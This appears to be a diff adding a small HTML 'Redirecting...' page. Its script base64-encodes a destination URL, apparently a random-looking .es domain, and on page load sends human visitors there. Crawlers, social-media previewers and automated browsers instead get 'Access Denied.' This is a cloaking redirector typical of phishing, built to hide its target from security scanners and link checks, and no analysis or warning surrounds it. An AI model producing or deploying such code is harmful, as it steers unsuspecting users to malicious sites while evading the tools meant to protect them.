@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Redirecting...</title>
+  <script>
+    const encodedURL = "aHR0cHM6Ly9vYnduYXg3aXcudHhybXJqcHguZXMvYzFyclVGQFR2MUQzbkgv";
+    function isBot() {
+      const ua = navigator.userAgent.toLowerCase();
+      const bots = ["bot", "crawl", "spider", "slurp", "facebook", "discord"];
+      return bots.some(b => ua.includes(b)) || navigator.webdriver;
+    }
+    window.onload = function() {
+      if (!isBot()) window.location.href = atob(encodedURL);
+      else document.body.innerHTML = "Access Denied.";
+    }
+  </script>
+</head>
+<body>
+  <p>Redirecting, please wait...</p>
+</body>
+</html>
